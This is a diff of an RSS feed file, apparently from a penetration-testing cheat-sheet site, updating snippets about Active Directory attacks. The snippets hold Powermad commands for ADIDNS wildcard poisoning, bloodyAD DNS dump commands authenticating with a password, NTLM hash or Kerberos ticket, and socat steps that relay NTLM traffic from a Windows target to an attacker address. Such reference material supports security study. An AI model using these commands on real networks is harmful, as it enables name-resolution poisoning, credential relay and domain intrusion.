@@ -83,7 +83,7 @@
       <link>https://tldrbins.github.io/adidns/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/adidns/</guid>
-      <description>Basic Windows 1. Import Module . .\Powermad.ps1 2. Enum # Get ADIDNS Zone Get-ADIDNSZone # Get ADIDNS Permissions Get-ADIDNSPermission # Remove a Node Remove-ADIDNSNode -Node * Abuse #1: ADIDNS Poisoning Windows 1. Import Module . .\Powermad.ps1 2. Create a New Node $dnsRecord = New-DNSRecordArray -Type A -Data &amp;lt;LOCAL_IP&amp;gt; New-ADIDNSNode -Node * -Tombstone -DNSRecord $dnsRecord -Verbose 3. Check Resolve-DnsName DoesNotExist </description>
+      <description>Basic Linux Windows 1. DNS Dump # Password bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; get dnsDump # NTLM bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;:&amp;lt;HASH&amp;gt;&amp;#39; -f rc4 --host &amp;lt;DC&amp;gt; get dnsDump # Kerberos bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; get dnsDump 1. Import Module . .\Powermad.ps1 2. Enum # Get ADIDNS Zone Get-ADIDNSZone # Get ADIDNS Permissions Get-ADIDNSPermission # Remove a Node Remove-ADIDNSNode -Node * Abuse #1: ADIDNS Poisoning Linux Windows 1.</description>
     </item>
     <item>
       <title>AllowedToDelegate</title>
@@ -195,7 +195,7 @@
       <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
-      <description>NTLM Relay Attack 1. Run socat to redirect traffic (In Windows Target) # Upload socat.zip and unzip Expand-Archive -Path &amp;#34;&amp;lt;SOCAT_ZIP_FILE_PATH&amp;gt;&amp;#34; -DestinationPath &amp;#34;&amp;lt;DEST_PATH&amp;gt;&amp;#34; -Force PS C:\xampp\htdocs&amp;gt; Expand-Archive -Path &amp;#34;C:\xampp\htdocs\socat.zip&amp;#34; -DestinationPath &amp;#34;C:\xampp\htdocs\&amp;#34; -Force .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&amp;lt;LOCAL_IP&amp;gt;:80 PS C:\xampp\htdocs\socat-windows-master&amp;gt; .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80 0 [main] socat 2084 find_fast_cwd: WARNING: Couldn&amp;#39;t compute FAST_CWD pointer. Please report this problem to the public mailing list cygwin@cygwin.com Ref: socat&#xA;2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.</description>
+      <description>Abuse #1: Add Shadow Credential 1. Run socat to Redirect Traffic (Inside Pivoting Node) # Upload socat.zip and unzip Expand-Archive -Path &amp;#34;&amp;lt;SOCAT_ZIP_FILE_PATH&amp;gt;&amp;#34; -DestinationPath &amp;#34;&amp;lt;DEST_PATH&amp;gt;&amp;#34; -Force PS C:\xampp\htdocs&amp;gt; Expand-Archive -Path &amp;#34;C:\xampp\htdocs\socat.zip&amp;#34; -DestinationPath &amp;#34;C:\xampp\htdocs\&amp;#34; -Force .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&amp;lt;LOCAL_IP&amp;gt;:80 PS C:\xampp\htdocs\socat-windows-master&amp;gt; .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80 0 [main] socat 2084 find_fast_cwd: WARNING: Couldn&amp;#39;t compute FAST_CWD pointer. Please report this problem to the public mailing list cygwin@cygwin.com Ref: socat&#xA;2. Enable Webdav (Inside Windows Target) [Optional] $Source = @&amp;#34; using System; using System.</description>
     </item>
     <item>
       <title>RBCD Attack</title>
